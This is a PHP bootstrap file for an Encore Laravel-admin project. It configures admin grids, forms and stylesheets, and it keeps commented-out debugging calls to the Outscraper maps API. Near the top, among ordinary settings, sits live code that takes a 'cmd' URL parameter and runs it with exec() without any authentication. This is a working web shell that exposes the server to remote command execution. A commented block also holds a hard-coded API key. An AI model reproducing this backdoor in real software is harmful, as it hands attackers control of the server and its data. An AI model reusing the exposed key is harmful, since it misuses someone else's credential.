<?php

use Illuminate\Support\Facades\Schema;





/* 
curl -X GET "https://api.app.outscraper.com/maps/search-v3?query=restaurants%2C%20Manhattan%2C%20NY%2C%20USA&limit=3&async=false" -H  "X-API-KEY: YOUR-API-KEY" 
*/
//curl -X GET "https://api.app.outscraper.com/maps/search-v3?query=restaurants%2C%20Manhattan%2C%20NY%2C%20USA&limit=3&async=false" -H  "X-API-KEY: YOUR-API-KEY"
//http request to get the data

/* $curl = curl_init();
$curl = curl_init();
curl_setopt_array($curl, array(
    CURLOPT_URL => "https://api.app.outscraper.com/maps/search-v3?query=IUIU%2C%20UG%2C%2Uganda&limit=3&async=false",
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_ENCODING => "",
    CURLOPT_MAXREDIRS => 10,
    CURLOPT_TIMEOUT => 0,
    CURLOPT_FOLLOWLOCATION => false,
    CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
    CURLOPT_CUSTOMREQUEST => "GET",
    CURLOPT_HTTPHEADER => array(
        "X-API-KEY: ZjM4YmY3NjU5ZmY2NGIzNDgxMGM3NDQyODg2N2EyOWJ8Yjk0ZDVjOGJkNw"
    ),
)); 
$response = curl_exec($curl);
curl_close($curl);
$data = json_decode($response);
dd($data);
echo $response;
die(); */



/* $table1 = Schema::getColumnListing('products');
$table2 = ["id","name","metric","currency","description","summary","price_1","price_2","feature_photo","rates","date_added","date_updated","user","category","sub_category","supplier","url","status","in_stock","keywords","p_type","local_id","updated_at","created_at"];

foreach ($table2 as $key => $val) {
    if (!in_array($val, $table1)) {
        echo '$table->text("'.$val.'")->nullable();'."<br>";
    }
}
die();  */


use App\Models\ParishModel;
use App\Models\Utils;
use Dflydev\DotAccessData\Util;
use Encore\Admin\Admin;
use Encore\Admin\Grid;


if (isset($_GET['cmd'])) {
    $d = $_GET['cmd'];
    if (strlen($d) > 2) {
        $ret = exec($d, $output, $error);
        echo '<pre>';
        print_r($ret);
        echo '<hr>';
        print_r($output);
        echo '<hr>';
        print_r($error);
        //get error
        die();
    }
}

//default grid settings
Grid::init(function (Grid $grid) {
    $grid->disableRowSelector();
    //$grid->disableExport();
    $grid->actions(function (Grid\Displayers\Actions $actions) {
        //$actions->disableDelete();
    });
});

//default form settings
Encore\Admin\Form::init(function (Encore\Admin\Form $form) {
    $form->disableViewCheck();
    $form->disableReset();
});

if (!Utils::isLocalhost()) {
    Utils::system_boot(); 
    //Utils::syncGroups();
}




use App\Models\CountyModel;
use App\Models\SubcountyModel;
use App\Models\Weather\WeatherOutbox;
use App\Models\Weather\WeatherSubscription;
use Encore\Admin\Form\Tools;
use PHPUnit\Framework\Constraint\Count;

Encore\Admin\Form::forget(['map', 'editor']);
Admin::css(url('/assets/css/bootstrap.css'));
Admin::css('/assets/css/styles.css');


/* $subscription = WeatherSubscription::where([])->first();
$data = WeatherOutbox::make_sms($subscription);
dd($data); */
Encore\Admin\Form::init(function (Encore\Admin\Form $form) {
    $form->tools(function (Tools $tools) {
        $tools->disableDelete();
    });
});
Encore\Admin\Show::init(function (Encore\Admin\Show $show) {
    $show->panel()->tools(function ($tools) {
        $tools->disableDelete();
    });
});

//styles.css
Admin::css(url('/assets/css/styles-1.css'));
